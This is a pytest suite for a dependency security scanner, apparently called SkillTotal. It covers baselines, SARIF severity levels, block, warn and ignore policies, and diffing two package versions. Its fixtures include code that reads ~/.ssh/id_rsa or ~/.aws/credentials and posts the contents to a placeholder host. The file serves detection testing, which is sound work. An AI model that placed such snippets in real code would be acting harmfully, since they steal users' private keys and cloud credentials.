"""A security team runs SkillTotal as a gate it owns: accepts known findings, sets per-rule policy,
reads results in Code Scanning and reviews what changed between two versions of a dependency."""

from __future__ import annotations

import json

EXFIL_JS = (
    "const fs = require('fs');\n"
    "const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');\n"
    "fetch('https://collect.example.invalid', { method: 'POST', body: key });\n"
)


def test_a_baseline_accepts_known_findings_and_still_catches_a_new_one(skilltotal,
                                                                       fixture_copy, tmp_path):
    repo = fixture_copy("malicious_npm_pkg")
    baseline = tmp_path / "baseline.json"
    written = skilltotal("scan", str(repo), "--write-baseline", str(baseline))
    assert written.code == 0 and baseline.exists()
    accepted = skilltotal("scan", str(repo), "--baseline", str(baseline), "--fail-on-high")
    assert accepted.code == 0, accepted.out
    (repo / "upload.js").write_text(EXFIL_JS.replace("id_rsa", "id_ed25519"), encoding="utf-8")
    caught = skilltotal("scan", str(repo), "--baseline", str(baseline), "--fail-on-high")
    assert caught.code == 2, caught.out
    assert "upload.js" in caught.out


def test_code_scanning_gets_risk_as_errors_and_capabilities_as_notes(skilltotal, fixture_copy,
                                                                     tmp_path):
    out = tmp_path / "r.sarif"
    skilltotal("scan", str(fixture_copy("malicious_npm_pkg")), "--sarif", "--output", str(out))
    run = json.loads(out.read_text(encoding="utf-8"))["runs"][0]
    rules = {r["id"]: r for r in run["tool"]["driver"]["rules"]}
    levels = {res["ruleId"]: res["level"] for res in run["results"]}
    assert levels["ST-COMBO-EXFIL"] == "error"
    assert "security-severity" in rules["ST-COMBO-EXFIL"]["properties"]
    assert levels["ST-SHELL-NODE"] == "note"  # what it can do is not a vulnerability
    assert "security-severity" not in rules["ST-SHELL-NODE"].get("properties", {})


def test_a_block_policy_forbids_a_capability_the_gate_would_pass(skilltotal, fixture_copy):
    repo = fixture_copy("malicious_npm_pkg")
    (repo / "steal.js").unlink()
    (repo / "index.js").write_text("require('child_process').exec('ls');\n", encoding="utf-8")
    (repo / "package.json").write_text('{"name": "tool", "version": "1.0.0"}\n',
                                       encoding="utf-8")
    assert skilltotal("scan", ".", "--fail-on-high", cwd=repo).code == 0  # capability only
    (repo / ".skilltotal.toml").write_text('[policy]\n"ST-SHELL-NODE" = "block"\n',
                                           encoding="utf-8")
    blocked = skilltotal("scan", ".", cwd=repo)
    assert blocked.code == 2, blocked.out


def test_an_ignore_policy_and_a_warn_policy_do_what_the_readme_says(skilltotal, fixture_copy):
    repo = fixture_copy("malicious_npm_pkg")
    (repo / ".skilltotal.toml").write_text(
        'fail_on = "high"\n[policy]\n"ST-COMBO-EXFIL" = "warn"\n"ST-INSTALL-DROPPER" = "warn"\n'
        '"ST-SENS-PATH" = "warn"\n"ST-SHELL-NODE" = "ignore"\n', encoding="utf-8")
    run = skilltotal("scan", ".", "--json", cwd=repo)
    report = json.loads(run.out)
    ids = {f["id"] for f in report["findings"]}
    assert "ST-SHELL-NODE" not in ids  # ignored: gone from the report
    assert "ST-COMBO-EXFIL" in ids  # warned: still reported
    assert run.code == 0  # ...but exempt from the severity gate


def test_a_dependency_update_that_adds_a_threat_fails_the_review(skilltotal, fixture_copy,
                                                                  tmp_path):
    old = fixture_copy("clean_pkg")
    new = tmp_path / "clean_pkg_next"
    new.mkdir()
    for path in old.rglob("*"):
        if path.is_file():
            target = new / path.relative_to(old)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(path.read_bytes())
    (new / "cleanlib" / "telemetry.py").write_text(
        "import os, urllib.request\n"
        "data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "urllib.request.urlopen('https://collect.example.invalid', data.encode())\n",
        encoding="utf-8")
    same = skilltotal("diff", str(old), str(old), "--fail-on-new", "high")
    assert same.code == 0
    worse = skilltotal("diff", str(old), str(new), "--fail-on-new", "high")
    assert worse.code == 2, worse.out
    assert "ST-COMBO-EXFIL" in worse.out


def test_code_the_engine_cannot_analyze_can_fail_the_gate(skilltotal, tmp_path):
    repo = tmp_path / "svc"
    repo.mkdir()
    (repo / "main.go").write_text("package main\nfunc main() {}\n", encoding="utf-8")
    assert skilltotal("scan", str(repo), "--fail-on-high").code == 0
    assert skilltotal("scan", str(repo), "--fail-on-unanalyzed").code == 2


def test_an_inline_ignore_counts_in_your_own_code(skilltotal, fixture_copy):
    repo = fixture_copy("malicious_npm_pkg")
    (repo / ".skilltotal.toml").write_text('fail_on = "high"\n', encoding="utf-8")
    before = skilltotal("scan", ".", cwd=repo)
    assert before.code == 2
    for name in ("index.js", "steal.js"):
        path = repo / name
        lines = path.read_text(encoding="utf-8").splitlines()
        path.write_text("\n".join(f"{line} // skilltotal:ignore" for line in lines) + "\n",
                        encoding="utf-8")
    (repo / "package.json").write_text('{"name": "tool", "version": "1.0.0"}\n', encoding="utf-8")
    after = skilltotal("scan", ".", cwd=repo)
    assert after.code == 0, after.out
